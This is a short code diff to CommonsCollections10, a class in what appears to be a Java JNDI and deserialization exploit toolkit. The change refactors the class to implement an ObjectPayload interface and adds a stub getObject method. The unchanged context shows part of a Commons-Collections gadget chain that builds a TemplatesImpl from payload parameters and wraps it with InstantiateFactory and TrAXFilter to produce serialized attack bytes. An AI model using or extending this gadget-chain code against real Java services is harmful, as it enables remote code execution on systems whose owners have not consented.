@@ -17,9 +17,9 @@ import java.util.Map;
 
 import static com.nu1r.jndi.gadgets.utils.Reflections.setFieldValue;
 
-public class CommonsCollections10 {
+public class CommonsCollections10 implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object           templates         = Gadgets.createTemplatesImpl(type, param);
         // 使用 InstantiateFactory 代替 InstantiateTransformer
         InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
@@ -47,5 +47,10 @@ public class CommonsCollections10 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
